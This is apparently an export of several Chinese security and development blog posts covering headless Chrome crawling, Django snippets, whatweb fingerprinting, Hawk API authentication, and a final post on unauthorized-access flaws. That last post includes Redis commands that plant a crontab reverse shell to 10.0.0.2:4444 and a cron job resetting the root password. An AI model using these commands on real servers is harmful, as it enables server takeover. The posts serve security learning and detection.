launch(args=['--no-sandbox']) chrome-remote-interface工具可以用来分析渲染一个页面过程中所有的请求过程，包括获取所有的请求接口以及响应内容等。再运行chrome-remote-interface代码前，需要先启动headless chrome进程，即：1chrome --headless --remote-debugging-port=9222 安装chrome-remote-interface：1npm install chrome-remote-interface 然后编写代码：(以获取所有请求url为例)1234567891011121314151617181920212223242526272829303132const CDP = require('chrome-remote-interface');// node nmask.js https://nmask.cnvar options = process.argv;var target_url = options[2];CDP((client) =&gt; &#123; // extract domains const &#123;Network, Page&#125; = client; // setup handlers Network.requestWillBeSent((params) =&gt; &#123; console.log(params.request.url); &#125;); Page.loadEventFired(() =&gt; &#123; client.close(); &#125;); // enable events then start! Promise.all([ Network.enable(), Page.enable() ]).then(() =&gt; &#123; return Page.navigate(&#123;url: target_url&#125;);//输出请求的url &#125;).catch((err) =&gt; &#123; console.error(err); client.close(); &#125;);&#125;).on('error', (err) =&gt; &#123; console.error(err);&#125;); 运行这段代码：1node nmask.js https://thief.one chromeless介绍chromeless社区比较火热，代码更新也非常频繁，个人比较看好。 chromeless安装chromeless对nodejs版本要求是&gt;8.2(centos7下node7.6测试可以)，因此需要先升级nodejs，升级方法参考前文；升级完以后，再安装chromeless项目环境。1234mkdir chromeless_testcd chromeless_testnpm initnpm install chromeless chromeless使用官方API文档：https://github.com/graphcool/chromeless/blob/master/docs/api.md#api-goto在线代码运行环境：https://chromeless.netlify.com 创建chromeless_test.js,写入：123456789101112131415161718const &#123; Chromeless &#125; = require('chromeless')async function run() &#123; const chromeless = new Chromeless() const screenshot = await chromeless .goto('https://www.baidu.com') //.type('chromeless', 'input[name="q"]') //.press(13) //.wait('#resultStats') .screenshot() console.log(screenshot) // prints local file path or S3 url await chromeless.end()&#125;run().catch(console.error.bind(console)) 运行代码：12nohup google-chrome --headless --remote-debugging-port=9222 &amp; #开启本地headless chromenode chromeless_test.js 注意：在运行chromeless前，需要先安装headless chrome，并且需要在本地开启--remote-debugging-port=9222，监听本地9222端口；chromeless也支持使用远程的headless chrome pychrome工具暂没有研究，尽情期待！ 常见问题Linux截图中文字体变方块如何解决？出现这类问题主要是因为linux服务器字体缺失的问题，解决方案是将字体文件copy到linux服务器/usr/share/fonts/zh_CN目录下。 第一步：从windows或者mac上获取字体文件，mac上的字体文件地址为：/Library/Fonts，windows字体地址为：c盘下的Windows/Fonts。将Fonts目录打包上传到linux服务器/usr/share/fonts/zh_CN目录下，然后解压。 第二步：设置权限1chmod -R 755 /usr/share/fonts/zh_CN 第三步：生成fonts.scale12yum -y install ttmkfdirttmkfdir -e /usr/share/X11/fonts/encodings/encodings.dir 第四步：修改字体配置文件123456vim /etc/fonts/fonts.conf在&lt;dir&gt;....&lt;/dir&gt;列表中添加字体如：&lt;dir&gt;/usr/share/fonts/zh_CN/Fonts&lt;/dir&gt; 第五步：刷新字体缓存1fc-cache 命令行运行headless chrome需要使用–disable-gpu参数吗？1目前--disable-gpu 标志在处理一些bug时是需要的，在未来版本的 Chrome 中就不需要了。 系统仍然需要安装Xvfb吗？1234不需要，Headless Chrome 不使用窗口，所以不需要像 Xvfb 这样的显示服务器。你问什么是 Xvfb？Xvfb 是一个用于类 Unix 系统的运行于内存之内的显示服务器，可以让你运行图形应用程序（如 Chrome），而无需附加的物理显示器。许多人使用 Xvfb 运行早期版本的 Chrome 进行 “headless” 测试。 如何创建一个运行 Headless Chrome 的 Docker 容器？1查看 lighthouse-ci。它有一个使用 Ubuntu 作为基础镜像的 Dockerfile 示例，并且在 App Engine Flexible 容器中安装和运行了 Lighthouse。 headless chrome和 PhantomJS 有什么关系？1Headless Chrome 和 PhantomJS 是类似的工具。它们都可以用来在无需显示的环境中进行自动化测试。两者的主要不同在于 Phantom 使用了一个较老版本的 WebKit 作为它的渲染引擎，而 Headless Chrome 使用了最新版本的 Blink。 下篇将介绍分布式漏扫爬虫框架的设计与实现，以及写爬虫过程中需要注意的点 参考文章https://zhuanlan.zhihu.com/p/29207391https://developers.google.com/web/updates/2017/04/headless-chromehttps://juejin.im/entry/58fd5e645c497d005803b6a4http://csbun.github.io/blog/2017/09/puppeteer/]]></content>
      <categories>
        <category>爬虫技术</category>
      </categories>
      <tags>
        <tag>Headless Chrome</tag>
        <tag>Puppeteer</tag>
        <tag>pychrome</tag>
        <tag>chromeless</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[记与某牛的一次饭局交流]]></title>
    <url>../../../../../../../../2018/02/05/1/</url>
    <content type="text"><![CDATA[好好学习，天天向上记录与某业界大牛前辈的一次饭局谈话，话后小弟终觉获益匪浅，心想有些关键问题与解惑过程值得一记与分享，因此便有了此文。 偏安全还是开发？ 由于我大学所读的专业偏研发而非安全，本人接触安全的时间也不长，再加上工作中还是以安全开发为主，因此便有了此疑惑。从职业发展（暂不管个人兴趣）来谈，我到底应该选择偏向安全呢？还是开发？ 这个问题一直困扰了我很久，在安全方面我算是刚入门；开发方面熟练python，但开发能力无法跟甲方的RD比。从个人兴趣上来说，我更偏向开发，当然是跟安全相关的开发，比如开发自动化扫描程序等等。但从职业前景上来说，真不知道该如何选择。 某牛结合自身十多年的安全经验给了我一些启迪：“选择偏开发为好，因为安全只是开发中发现的一些bug，只要对开发有深入的了解与实践，那么安全也就自然会懂。”（不一定是原画，但含义一样） 安全杂而广，是选择深入一面，还是面面俱到？ 接上个问题的背景，由于本人的安全能力一般，因此在安全方面还有很多短板，比如说逆向、二进制等，可以说是盲区。因此是否需要学习这些技能，以增加自身安全的能力，还是专注一个方面研究，比如说web安全？ 某牛结合自身十多年的安全经验给了我一些解答：“选择一个方向精通，至于其他方面的技术，等需要的时候再学，如若工作中不需要，则不必要学习，因为长时间不用则会遗忘。”（不一定是原画，但含义一样） 机器学习很火，是否适合安全行业？ 最近几年机器学习可以说是很火热，我也一直想往这方面学习发展，将机器学习应用于安全领域。当然这一块的学习成本比较高，因此我一直还没入门，那么机器学习很火，是否适合安全行业？ 某牛结合自身十多年的安全经验给了我一些建议：“建议不要踏入机器学习的坑，安全不同其他行业，机器学习未必能解决安全问题，比如机器学习能识别哪些是敏感数据吗？学习前的数据打标工作，需要耗费大量的人力，安全防护能力有时靠人力堆规则，而不是机器学习就能解决的。”（不一定是原画，但含义一样） 后记 有句话叫“纸上得来终觉浅”，光从书本上学习知识可能还不够，适当的时候可以多听听前辈的经验之谈，走走前辈走过的路，踩踩前辈踩过的坑。当踩得坑足够多了，走过的路足够长了，当然也不能忘记时刻保持学习的习惯，适当的运动保持健康的身体，过个几年，十几年，也许大家都能成为大牛。]]></content>
      <categories>
        <category>生活杂谈</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[记Django开发中的一些常用代码段]]></title>
    <url>../../../../../../../../2018/01/26/1/</url>
    <content type="text"><![CDATA[2018年的第一场雪，比2002年来得更晚一些 记得之前有分享过Django开发相关的系列文章（可在博客右上方自行搜索），内容包括模版、视图、路由等。那么本篇再补充一些Django开发过程中常用到的一些功能代码块，内容涉及前端、后端相关功能代码。这些代码块都是平常开发中常用的，因此在此做个备份，方便查询。 前端功能搞安全的还需要会前端？当然啊，搞安全的也需要出产品，出产品了没前端不就显得很low吗？不过自己写前端太累了，因此还得用框架，这里推荐Bootstrap。在尝试使用文章下方介绍的前端代码前，先在代码中添加上Bootstrap框架提供给的css、js连接。 面板折叠这个功能经常在侧边菜单栏中用到，面板折叠可有效的保持界面整洁。1234567891011&lt;div class="panel panel-success"&gt;&lt;div class="panel-heading" data-toggle="collapse" data-parent="#accordion" href="#collapse"&gt; &lt;h1 class="panel-title"&gt;&lt;span class="glyphicon glyphicon-tag" aria-hidden="true"&gt;&lt;/span&gt;Index&lt;/h1&gt;&lt;/div&gt;&lt;div id="collapse" class="panel-collapse collapse out"&gt; # out or in 控制折叠状态 &lt;div class="panel-body"&gt; &lt;a href=""&gt;index1&lt;/a&gt;&lt;br&gt;&lt;br&gt; &lt;a href=""&gt;index2&lt;/a&gt;&lt;br&gt;&lt;br&gt; &lt;/div&gt;&lt;/div&gt;&lt;/div&gt; 表格分页表格分页前端比较简单，想要实现真正的分页显示数据，需要结合后端代码，文章后面会介绍。12345678910111213141516171819&lt;!-- 分页 --&gt;&lt;form action="&#123;% url 'asset_list' %&#125;" method="POST"&gt;&#123;% csrf_token %&#125;&lt;ul class="pagination pagination"&gt; &lt;li&gt;&lt;a href="&#123;% url 'asset_list' %&#125;?page=0&amp;search_key=&#123;&#123;search_key&#125;&#125;"&gt;首页&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="&#123;% url 'asset_list' %&#125;?page=&#123;&#123;pre_page&#125;&#125;&amp;search_key=&#123;&#123;search_key&#125;&#125;"&gt;上一页&lt;/a&gt;&lt;/li&gt; &#123;% for i in page_list %&#125; &lt;li&gt;&lt;a href="&#123;% url 'asset_list' %&#125;?page=&#123;&#123; i &#125;&#125;&amp;search_key=&#123;&#123;search_key&#125;&#125;" class="active"&gt;&#123;&#123; i &#125;&#125;&lt;/a&gt;&lt;/li&gt; &#123;% endfor %&#125; &lt;li&gt;&lt;a href="&#123;% url 'asset_list' %&#125;?page=&#123;&#123; next_page &#125;&#125;&amp;search_key=&#123;&#123;search_key&#125;&#125;"&gt;下一页&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="&#123;% url 'asset_list' %&#125;?page=&#123;&#123; last_page &#125;&#125;&amp;search_key=&#123;&#123;search_key&#125;&#125;"&gt;尾页&lt;/a&gt;&lt;/li&gt; &amp;nbsp; &lt;li&gt; &lt;input type="text" placeholder="输入页码" ng-model="gotoPage" class="" style="width: 80px" name="page"&gt; &amp;nbsp; &lt;input type="submit" class="btn btn-default" name="" value="跳转到" style="width:70px;height: 34px"&gt; &lt;/li&gt; &lt;/ul&gt;&lt;/form&gt; 控制表格单元格内容自动换行有些时候表格中单元格内容太长，会导致表格整体很不好看，因此对于内容会很长的表格列需要添加如下style1&lt;td style="word-wrap:break-word;word-break:break-all;"&gt;test&lt;/td&gt; 弹出框（可编辑）有些时候需要修改一些表格数据，之前的做法是点击一个按钮，跳转到一个修改的页面，但这种做法不够优雅，因此可以选择点击按钮弹出一个可编辑的对话框。12345678910111213141516171819202122232425262728293031&lt;form action="/index/" method="POST"&gt;&lt;div class="modal fade" id="update" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true"&gt; &lt;div class="modal-dialog"&gt; &lt;div class="modal-content"&gt; &lt;div class="modal-header"&gt; &lt;button type="button" class="close" data-dismiss="modal" aria-hidden="true"&gt; &amp;times; &lt;/button&gt; &lt;h4 class="modal-title" id="myModalLabel"&gt; 提醒框 &lt;/h4&gt; &lt;/div&gt; &lt;div class="modal-body"&gt; &lt;label&gt;KEY&lt;/label&gt; &lt;input type="text" class="form-control" name="new_key" value="&#123;&#123;i.key_&#125;&#125;"&gt; &lt;label&gt;VALUES&lt;/label&gt; &lt;input type="text" class="form-control" name="new_value" value="&#123;&#123;i.value_&#125;&#125;"&gt; &lt;/div&gt; &lt;div class="modal-footer"&gt; &lt;button type="button" class="btn btn-default" data-dismiss="modal"&gt;关闭 &lt;/button&gt; &lt;button type="submit" name="update_id" value="&#123;&#123;i.id&#125;&#125;" class="btn btn-primary"&gt; 确定修改 &lt;/button&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;input type="button" data-toggle="modal" data-target="#update" class="btn btn-info" value="修改"&gt;&lt;/form&gt; 弹出提醒框（不可编辑）这个功能主要作用删除数据、修改数据时的提醒。123456789101112131415161718192021222324252627&lt;form action="/index/" method="POST"&gt;&lt;div class="modal fade" id="del" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true"&gt;&lt;div class="modal-dialog"&gt;&lt;div class="modal-content"&gt; &lt;div class="modal-header"&gt; &lt;button type="button" class="close" data-dismiss="modal" aria-hidden="true"&gt; &amp;times; &lt;/button&gt; &lt;h4 class="modal-title" id="myModalLabel"&gt; 提醒框 &lt;/h4&gt; &lt;/div&gt; &lt;div class="modal-body"&gt; 您确定要删除记录吗？ &lt;/div&gt; &lt;div class="modal-footer"&gt; &lt;button type="button" class="btn btn-default" data-dismiss="modal"&gt;关闭 &lt;/button&gt; &lt;button type="submit" name="del_id" value="&#123;&#123;i.id&#125;&#125;" class="btn btn-primary"&gt; 确定删除 &lt;/button&gt; &lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;input type="button" data-toggle="modal" data-target="#del" class="btn btn-danger" value="删除"&gt;&lt;/form&gt; 搜索框自动补全这个就厉害啦，当搜索一些资源的时候，如果能自动补全是不是会方便很多呢？12345678910&lt;label for="autocomplete"&gt;选择扫描插件（必选）&lt;/label&gt;&lt;br&gt;&lt;input class="form-control" id="autocomplete" name="vul_name" placeholder="输入漏洞名称"&gt;&lt;br&gt;&lt;br&gt;&lt;script type="text/javascript"&gt;var tags = &#123;&#123; plugin_list|safe &#125;&#125;; # 注plugin_list$( "#autocomplete" ).autocomplete(&#123; source: tags&#125;);&lt;/script&gt; ajax请求用ajax发送请求有好有坏，具体用法可参考：https://thief.one/2017/09/14/3/ 界面面板布局这个纯粹为了装逼。12345678910111213141516171819202122&lt;div class="container"&gt; &lt;div class="row"&gt; ####### 面板 ########## &lt;div class="col-md-3"&gt; &lt;div class="list-group"&gt; &lt;form class="list-group-item"&gt; &lt;a href=""&gt;test&lt;/a&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; ####### 面板 ########## &lt;div class="col-md-3"&gt; &lt;div class="list-group"&gt; &lt;form class="list-group-item"&gt; &lt;a href=""&gt;test2&lt;/a&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 表格单选框表格显示数据是常见的功能，一般情况下需要多表格数据进行删改，因此批量选中就很重要。一般表格中的批量选择，可以使用单选框实现。1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253&lt;!-- 导入js --&gt;&lt;script src="https://cdn.bootcss.com/jquery/2.1.1/jquery.min.js"&gt;&lt;/script&gt;&lt;!-- 表格数据 --&gt;&lt;div id="list"&gt; &lt;table class="table table-hover table-bordered table-striped"&gt; &lt;thead&gt; &lt;tr&gt; &lt;th&gt;&lt;input type="checkbox" id="all" name="task_check_" value=""&gt;&lt;/th&gt; &lt;th&gt;ID&lt;/th&gt; &lt;th&gt;User&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt; &lt;tbody&gt; &lt;tr&gt; &lt;th&gt;&lt;input type="checkbox" id="" name="task_check" value=""&gt;&lt;/th&gt; &lt;td&gt;01&lt;/td&gt; &lt;td&gt;nmask&lt;/td&gt; &lt;td&gt; &lt;a href="" class="link"&gt;修改&lt;/a&gt;&amp;nbsp;&amp;nbsp; &lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;/table&gt;&lt;/div&gt;&lt;!-- js --&gt;&lt;script&gt;$(document).ready(function () &#123; //全选或全不选 $("#all").click(function () &#123; if (this.checked) &#123; $("#list :checkbox").prop("checked", true); &#125; else &#123; $("#list :checkbox").attr("checked", false); &#125; &#125;); //设置全选复选框 $("#list :checkbox").click(function () &#123; allchk(); &#125;); function selectAll(check)&#123; $(check).click(function()&#123; if ($(check).is(':checked')) &#123; $(".list input").prop("checked",true); &#125;else&#123; $(".list input").prop("checked",false); &#125;; &#125;); &#125; //显示时执行一次 selectAll();&#125;);&lt;/script&gt; 后端功能表格分页前面介绍了前端的分页，那么后端怎么写分页的功能呢？django框架有内置的分页模块Paginator，其他框架也有，比如flask等。123456789101112131415161718192021222324252627282930313233343536373839404142434445from django.core.paginator import Paginatordef page_fenye(objects,page,num=10): '''分页函数 @num:每页显示多少条数据 @page:当前页码 @fenye_num:分页栏显示的数字数量 return： @object_list:该页显示的数据对象 @page_range:分页栏显示的数字范围 @last_page:最后一页的数字 ''' fenye_num=6 fenye_num_av=fenye_num/2 try: page=int(page) except: page=1 if page&lt;1: page=1 range_first_page=page-fenye_num_av range_last_page=page+fenye_num_av if range_first_page&lt;0: range_first_page=0 range_last_page=fenye_num p = Paginator(objects, num) page_range=list(p.page_range)[range_first_page:range_last_page] last_page=len(p.page_range) if page&gt;last_page: page=1 page1 = p.page(page) object_list=page1.object_list return object_list,page_range,last_page 但个人使用以后发现性能不好，因为每次请求页面需要先获取所有的数据，再通过此模块计算出此页面需要展示的数据，当所有的数据量比较大时，返回就比较慢了(也可能是我没用对这个模块)。因此，我自己写了一个分页的模块。1234567891011121314151617181920212223242526272829303132333435363738394041def fenye(all_num,page,num,page_list_num): '''分页计算 @all_num:数据库记录总量 @page:当前页码 @num:每一页显示的记录条数 @page_list_num:分页导航显示多少个数字，要为偶数 @page_list_aver:page_list_num除以2 return： @page:显示第几页 @last_page:最后一页的数字 @page_list:分页栏显示的数字范围 ''' page=int(page) if all_num!=0: last_page = all_num/num-1 if all_num%num == 0 else all_num/num #计算最后一页数字 else: last_page=0 page_list_aver=page_list_num/2 page=last_page if page &gt; last_page else page #判断请求的页数是否超过范围 if page &gt; page_list_aver: if last_page &gt; page+page_list_aver: page_list=range(page - page_list_aver , page + page_list_aver) else: page_list=range(last_page - (page_list_num-1), last_page + 1) else: if last_page &gt; page_list_num: page_list = range(page_list_num) else: page_list = range(last_page + 1) return page,last_page,page_list 这样不需要提前先查询出所有的数据存入内存，而只需要查询出总共存在多少条数据（注意，这里的查询语句由select * 改为select count(*)会快很多）。获取到分页函数返回的page后，可以结合sql语句中的limit功能，查询分页要展示的数据内容。1select * from test limit page*num,num # page为分页返回的显示页码，num是一页显示的数据数量 session做身份认证这个功能就是用来验证用户身份的，可配合登录功能，写一个装饰器函数，检查全局是否存在session值。（session值是一个字典格式，在用户登录时生成）12345678910111213141516def session_check(level=2,return_=False): '''session_check装饰器函数 针对函数 @level：可以给用户区分权限 @return_:检测到不存在session后跳转到不同的页面 ''' def dec(func): def warp(request,*args,**kwargs): if request.session.get('user_id',False) and int(request.session.get('level'))&lt;=level: return func(request,*args,**kwargs) elif return_: return HttpResponse('&lt;head&gt;&lt;meta http-equiv="refresh" content="0.0001;url=/login/"&gt;&lt;/head&gt;') else: return HttpResponse('&lt;head&gt;&lt;meta http-equiv="refresh" content="0.0001;url=/error/"&gt;&lt;/head&gt;') return warp return dec 使用的话，直接在需要权限控制的函数上添加：1234@session_check(return_=True)def vul_index(request): ''' 漏洞扫描 ''' pass 暂时就想到了这些，先记这么多吧，等以后遇上了再补充一些，o了]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>django</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用Whatweb获取Web指纹信息]]></title>
    <url>../../../../../../../../2018/01/11/1/</url>
    <content type="text"><![CDATA[我都寂寞多久了还是没好感觉全世界都在窃窃嘲笑 又是很久没有更新博客啦，为啥呢？因为在忙开发、开发、开发。我最近在研究指纹扫描以及漏洞扫描方面的设计与开发，从前端、后端到数据存储、消息队列再到分布式部署，感觉自己简直快成全栈了。不过开发过程中也有很多收获，有时间我会写博客分享一下。 那么今天写点啥呢？就分享个很老的安全工具吧——whatweb，相信很多朋友应该知道，用来扫web指纹的。为啥会用到它，因为项目需要啊，其实也可以不用，因为我自己写了很多扫描指纹的插件，这个只是作为备案选择而已。但既然用到了，那就理所当然要为它打call。好了，照旧先介绍如何安装，再介绍如何使用，本文重点在于环境安装，以及如何在python代码中比较优雅的使用whatweb。 安装升级rubywhatweb是用ruby开发的，因此服务器上需要安装ruby，且对版本有要求，貌似必须2.0以上（没记错的话）。目前很多服务器内置的ruby是1.8的，或者用yum install ruby安装的也是1.8的，因此需要安装或者升级版本到2.0以上才行。 升级方案one（推荐）先删除原来的ruby：1yum remove ruby ruby-devel 下载ruby安装包，并进行编译安装：12345wget http://cache.ruby-lang.org/pub/ruby/2.1/ruby-2.1.2.tar.gztar xvfvz ruby-2.1.2.tar.gz./configuremakesudo make install 将ruby添加到环境变量，ruby安装在/usr/local/bin/目录下，因此编辑 ~/.bash_profile文件，添加一下内容：1PATH=$PATH:/usr/local/bin/ 不要忘了生效一下：1source ~/.bash_profile 参考：http://ask.xmodulo.com/upgrade-ruby-centos.html 升级方案two先安装rvm，这是ruby的包管理器:12$ curl -L get.rvm.io | bash -s stable $ source ~/.bash_profile 测试是否安装成功:1rvm -v 利用rvm升级ruby:123ruby -v #查看当前ruby版本 rvm list known #列出已知的ruby版本rvm install 2.0 #安装ruby 2.0 安装whatweb说起来这个就很简单，直接去github上clone下项目：1git clone https://github.com/urbanadventurer/WhatWeb.git 项目内已经有编译好的可执行文件，whatweb，只需要添加个环境变量：1PATH=$PATH:/root/WhatWeb-master/ 使用whatweb具体详细的使用方式就要参考github了，我这边只介绍怎么在python中使用whatweb。 废话不多说，直接上代码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#! -*- coding:utf-8 -*-import commandsimport re# 正则表达式p_httpserver=re.compile(r"HTTPServer\x1b\[0m\[\x1b\[1m\x1b\[36m([^,]+?)\x1b\[0m\]")p_title=re.compile(r"Title\x1b\[0m\[\x1b\[1m\x1b\[33m(.+?)\x1b\[0m\]")p_ip=re.compile(r"IP\x1b\[0m\[\x1b\[37m([^,]+?)\x1b\[0m\]")p_country=re.compile(r"Country\x1b\[0m\[\x1b\[37m([^,]+?)\x1b\[0m\]")p_cookies=re.compile(r"Cookies\x1b\[0m\[\x1b\[37m([^,]+?)\x1b\[0m\]")p_x_powered_by=re.compile(r"X-Powered-By\x1b\[0m\[\x1b\[37m([^,]+?)\x1b\[0m\]")def re_grep(p,content): # 正则处理 L=p.findall(content) if len(L)&gt;0: return L[0] else: return ""def whatweb(url): # whatweb扫描 result="" httpserver="" title="" ip="" cookies="" country="" power_by="" try: status,result=commands.getstatusoutput('whatweb '+url) # print status,result except IndexError,e: print e else: httpserver=re_grep(p_httpserver,result) title=re_grep(p_title,result) ip=re_grep(p_ip,result) country=re_grep(p_country,result) cookies=re_grep(p_cookies,result) power_by=re_grep(p_x_powered_by,result) return httpserver,title,cookies,country,power_byif __name__=="__main__": result=whatweb("thief.one") for i in result: print i 说明：解释一下代码，主要就是一个正则表达式，因为运行whatweb会直接将结果打印，当然也有其他命令可以让其结果输出到文本等，但如果想要批量自动化扫描的话，需要实时获取whatweb的内容，生成文件的方式显然不行，因此我用了commands库，让python执行系统命令并获取返回结果，然后就是几个正则对结果的匹配。 结束之语：又水了一篇，嗯嗯！ 如果有朋友有更好地在python代码中使用whatweb的方法，麻烦告知，我是被whatweb的输出折腾的够呛，因此才选择了用正则，无奈之举。]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>whatweb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTP-API认证，Python实现方案]]></title>
    <url>../../../../../../../../2017/12/11/1/</url>
    <content type="text"><![CDATA[一杯敬自由，一杯敬死亡 标题写的比较模糊拗口，简单来说本文就是介绍如何利用python将http的api接口做加密认证，防止不法分子乱用。这里有几个前提需要说明下，首先我们要实现的是http的加密认证，因此不考虑https。其次认证的目的是为了让一个http的api接口让正确的（通过认证的）人使用，而不是任何都可以用。 设计方案明白了http api认证的目的，那么就来设计方案吧！ 最偷懒的方案我之前写过几个api接口，主要是自己用来传输一些数据库数据的，由于数据有一点敏感，因此使用了认证。当时为了偷懒，认证的方式写得特别简单无脑，即在api接口上增加了一个auth字段，字段的内容会在服务端进行校验，但其内容是一串写死的md5。这虽然也算是一种认证方式(不知道auth字段内容的朋友无法拿到api接口的数据)，但如果局域网内流量被监听，那这种方案就形同虚设了。 比较简单实用的设计方案一种比较好的设计方案，是在客户端与服务端实现一套加密算法，算法可自定义但最好复杂一点。如将请求的参数以及内容以一定的方式排列后，可以再加上时间戳，整体做一个hash运算。服务端将获取的参数同样做hash，与客户端传递的hash做对比。因为有了时间戳，即使被监听了流量，进行流量重放也是不能认证成功的。（因为时间戳存在差异） 说明一下：本文介绍的是api的一个认证方式，这跟网站啥的认证还是有区别的。主要还是看api的应用场景，如果是给内部人员调用，而且调用的用户不多，其实以上认证方案足够了。因为用来加密的密钥（key）可以用其他安全的方式发送给用户（甚至可以写纸上，2333），而不必像https协议一样，使用非对称加密+对称加密，并且使用数字证书等一系列复杂的加密认证方式。 好了，前文介绍了一些api认证的方案，那么接下来再写点啥呢？我不打算介绍怎么去开发一个认证方案的代码，我主要想推荐一个开源的项目—hawk，因为它就是用来实现http加密认证的，而且它有一个python的实现模块（mohawk），推荐它是因为它比较简单实用。 因为之前研究过mohawk模块2个小时（真的是2个小时），因此本文主要介绍一下mohawk的用法。企业内部一般自己设计api的加密认证方案（一般是生成一个token密文，严格一点的会做双因子认证），因此这个模块适合给初学者练练手，也可以给打算自己设计认证方案的朋友提供一种思路。以下内容是我阅读mohawk文档总结的一些基础用法，更详细的可以参考下官网文档。 hawk介绍hawk项目地址：https://github.com/hueniverse/hawkpython实现：https://github.com/kumar303/mohawk官方文档：https://mohawk.readthedocs.io/en/latest/ 安装hawk1pip install mohawk 构建一个webserver这里我使用python的falcon框架来构建一个api webserver，如果对falcon框架不熟悉，可以先阅读：https://thief.one/2017/11/27/1/123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384import falconfrom mohawk import Receiver # 导入mohawk模块的Receiver方法from wsgiref import simple_server# 认证字典,可以创建不同的用户，每个用户都可以用不同的密钥（key）allowed_senders=&#123; "test":&#123; 'id': 'test', 'key': '110', 'algorithm': 'sha256' &#125;, # test 用户组 "nmask":&#123; 'id': 'nmask', 'key': '112', 'algorithm': 'sha256' &#125;, # nmask 用户组&#125;def lookup_credentials(sender_id): ''' 验证用户是否在允许的范围内 ''' if sender_id in allowed_senders: return allowed_senders[sender_id] else: raise LookupError('unknown sender')class Test(object): def on_post(self, req, resp): ''' http post 方法 ''' try: Receiver( lookup_credentials, req.headers.get('AUTHORIZATION'), # 请求时生成的密钥 req.url, req.method, content= req.stream.read(), content_type=req.headers.get('CONTENT-TYPE') ) except Exception,e: ''' 报错则说明认证失败 ''' print e resp.status = falcon.HTTP_403 # This is the default status else: resp.status = falcon.HTTP_200 # This is the default status resp.body = ('Hello World!') def on_get(self, req, resp): ''' http get 方法 ''' try: Receiver( lookup_credentials, req.headers.get('AUTHORIZATION'), req.url, req.method, content= req.stream.read(), content_type=req.headers.get('CONTENT-TYPE') ) except Exception,e: print e resp.status = falcon.HTTP_403 # This is the default status resp.body = ('authorization fail!') else: resp.status = falcon.HTTP_200 # This is the default status resp.body = ('Hello World!')app = falcon.API()test = Test()app.add_route('/', test)if __name__ == '__main__': httpd = simple_server.make_server('127.0.0.1', 8000, app) httpd.serve_forever() 构建一个http请求搭建好webserver以后，我们自然需要构建http请求，去验证请求是否经历了认证的过程，且认证的结果是否正确，这里使用requests包去构建。123456789101112131415161718192021222324252627282930313233343536import jsonimport requestsfrom mohawk import Sender # 导入mohawk模块的Sender方法url = "http://127.0.0.1:8000/"post_data = json.dumps("") # 如果是get请求，参数内容可以设置为""content_type = 'application/x-www-form-urlencoded'# 用于认证的字典credentials = &#123; 'id': 'test', 'key': '10', 'algorithm': 'sha256' &#125;sender = Sender(credentials, url = url, # 必填 method = 'POST', # 必填 content = post_data, # 必填，如果是get请求，参数内容可以设置为"" content_type = content_type # 必填 )print sender.request_header # 生成的密文，通过header的形式传递到服务端res=requests.post( url = url, data = post_data, headers=&#123; 'Authorization': sender.request_header, 'Content-Type': content_type &#125; )print res.status_codeprint res.text mohawk模块说明mohawk是hawk的python实现，有几个主要方法：Sender、Receiver等，详细的可以去阅读源码。 Sender方法用来生成在http请求认证中所需的密码，该方法需要传递几个参数，比如：url、method、content（post_data）、content_type、credentials(认证的字典，包含了id、key、加密方式)等，该方法会根据传递的参数值，生成一个密文密码，然后我们可以将其放在headers中传递到服务端。 Receiver方法用来在服务端接收客户端传递的请求，根据获取的参数的内容计算出一个新的密文密码，与客户端传递的密文进行对比，达到认证的效果。]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[未授权访问漏洞的检测与利用]]></title>
    <url>../../../../../../../../2017/12/08/1/</url>
    <content type="text"><![CDATA[一杯敬故乡，一杯敬远方 最近在研究未授权访问漏洞的检测方式，也写了一部分检测脚本，准确率还挺高。当然光有检测还是不够的，最好能有漏洞利用过程，这样也好证明漏洞的风险性，便于推动漏洞修复也便于自己对漏洞更深入的了解。本文关于漏洞利用以及修复的内容绝大部分转载自：安全脉搏，其实个人习惯是不喜欢全文照搬其他文章的，但无奈这篇文章总结的很好，我又没很多时间去整理，因此对其改动的不多，请读者务必谅解。 redis未授权访问漏洞漏洞描述redis安装完以后，默认是没有账号密码的（安装redis详细可参考：redis相关笔记，如果redis是以root权限去运行，则可以被反弹shell或者写入ssh密钥，从而被获取服务器的权限。 漏洞检测1234567s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((host,port))s.send("INFO\r\n")result = s.recv(1024)if "redis_version" in result: print "exist vul" 客户端连接测试一下：12345$redis-cli -h host -p port&gt;CONFIG get requirepass1) "requirepass"2) ""说明：表示没有设置密码，默认为没有密码。 漏洞利用利用crontab反弹shell自己服务器上监听一个端口(10.0.0.2)1nc -lvnp 4444 执行命令:12345redis-cli -h 10.0.0.1set x "\n* * * * * bash -i &gt;&amp; /dev/tcp/10.0.0.2/4444 0&gt;&amp;1\n"config set dir /var/spool/cron/config set dbfilename rootsave 利用crontab修改root密码为了不覆盖原来的crontab，可以在etc/cron.d目录下写入计划任务，其次可以直接修改root密码。12345redis-cli -h 10.0.0.1set webshell "\n* * * * * root echo nmask | passwd --stdin root\n"config set dir /etc/cron.dconfig set dbfilename rootsave 